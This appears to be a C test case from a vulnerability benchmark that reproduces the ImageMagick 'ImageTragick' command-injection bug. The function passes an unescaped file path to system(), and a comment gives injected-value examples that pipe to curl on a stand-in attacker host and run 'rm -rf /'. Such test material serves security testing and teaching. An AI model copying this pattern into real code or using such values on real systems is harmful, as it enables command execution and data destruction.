/*
 * test_7.c
 *
 * Inspired by: CVE-2016-3714 (ImageMagick "ImageTragick", disclosed May 2016)
 * CWE: CWE-78 (OS Command Injection)
 *
 * Bug: MVG/MSL decoder passes attacker-controlled filename to delegate
 * handler which builds a shell command with unsanitised user input.
 */

#include <stdio.h>
#include <string.h>

int imagemagick_delegate_convert(const char *input_path, const char *output_path)
{
    char cmd[512];

    if (input_path == NULL || output_path == NULL)
        return -1;

    /*
     * BUG: input_path like "x.jpg|curl attacker.com" or "; rm -rf /" is
     * interpolated into a shell command without escaping.
     */
    snprintf(cmd, sizeof(cmd), "convert '%s' '%s'", input_path, output_path);
    return system(cmd);
}
